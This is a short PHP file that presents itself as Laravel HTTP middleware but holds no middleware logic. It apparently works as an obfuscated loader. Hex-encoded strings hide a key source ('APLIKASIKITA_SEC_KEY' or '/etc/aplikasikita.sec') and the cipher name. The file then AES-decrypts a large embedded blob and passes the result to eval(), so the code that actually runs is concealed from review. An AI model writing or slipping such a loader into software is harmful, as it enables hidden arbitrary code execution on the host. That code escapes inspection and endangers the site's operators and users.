<?php
namespace App\Http\Middleware;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('yltvOXOEk6KpOBSeJn97cg==');

$c=base64_decode(

'gy3jdl1gd9XVcEqbV+6UOrnKmOoCAdyiOitbb0xgPZUOFS9GkpfFcxLiUUv/28SOt4LZGLOHxmzk' .
'MNF+1OacccJTY2otpAr7+zMz/99upOs073WGOAoEFnUEwJcjweWH96SGz6w4nj8bPetYhD3NBAn+' .
'sch894UGMb89VmN81Yt7VSDqOiTBM+xci7uyT/+UcQOqRzLbYMEr60leo5wHJrUqkoC6twMhg854' .
'SzWGjbWck5pOG6j15mcF5XBpOh6v8cLj5atqHVcw9nSMJxuyXsg3YKkpcIwfRPwswHCNTiHKKSb9' .
'NXjJ58SUAzuiTT4JAORugF/BRekIOsBprvjd1t2qpCaPUrn4CEZ/DQO7OWO2Dw+vsxbxpGjJ8+z2' .
'V+vfQzfJIVxR+iW6oNkoS/bUP34kjjNskp0yPvKuD1dqF4xfXH9ZFEK2tw0KtWbCu3+K2VHhPns9' .
'eJGzTl2nnDMTRKzini7xAe9AWLgRQQSIW7E1du9KjiGXt0d3Ckp4QqcOLsX1EvcDLD0CkeuaeHtU' .
'n3PHgawHyhpgcBkex087fR1CviBGZ40RQ+/muiGoi9Fsn5OOW+M2+mxPqh0U9b6Fu423FE9q5QbF' .
'CBAxEv9BSOeOOf0CPXB2/IcU6rDS0Fqk1F3SKhk1KRBqANh1NsHd+KvQfFFZwCZAMbv728Mdcr1X' .
'AgD4n8BgwdfL55jwpXk29f72Q9twPeJHDY3n/vU65EdVdMJ1LCT2GKpZcJ2aQ2wj/xAsmrpsa3x3' .
'xKYXfKZnevkIH/Rey8aq/R+EbypJdOMTdZ0vvVsep5wicxMOTxcnSNuxMbkWhtQzbRWbPJboPWdE' .
'/lh+L2DDV9DQN2eF5JjeNnyq14TcFovr2st3Vr4Z6l1ZwNUWQVJv6WsJnzxfZ79zn2oBjlGkgPID' .
'XV2TPMHXDyJ1p2uqGnCj3Q2bLB4YazLBUajh/Pt268BmiIqpaeCNJLkGq7CA7Y2Iy95bC7DJrjTR' .
'w9uSzGZKopjI1czyKhofHAr/9a9bYo2mw9jgOSvcaOMhXdiBK83pmwtyQ0mq2rWkOUXYh95Kbi0R' .
'boCN2eI0bewCcOKeSMGNNI4+z8bhB5RsONZjOuJJKIz9FL+SBnTlZh18t6qMHJY0AjnKLBfli3Gh' .
'vo0FiqnrS9kv1ZRaDKdzgrJBMGubS5JUas7AbfUjm+d5NfPYMnJDX3NnIc58ZTRqxi9QgbkEHQIU' .
'/F+GTw0C5/JD/S6S0+cFhQRGR4BcXN5dhMzif8NInAz0R8Hk8F2pSj8avgGmPBR+P8TV9RMuRSug' .
'MfNpPJt/JGCO9fQ7MZwbXgoJOLHTaz+llZu6tydU14//hpUlQJFM4EbRrOUXDRa9aoz3Obb79A78' .
'Oh8s0s0vt7xpxaO0EQkm06X+iyJKtHAm9WXqwLFJk8Egyiu8eVHgHLTw+l4tPxgjV+MD9cFfjqjY' .
'oRMFe1V9NQALM8UgqofWsCJLCCWcMFm8MJ74d1XCGNWX2RCDgX7ft7TUcoVA1Arc2cKcTOlCY9AP' .
'1Gx/Qy+Qd9qNdiCXOaBAuOwHQ8H3Wt3t6YWpFw=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

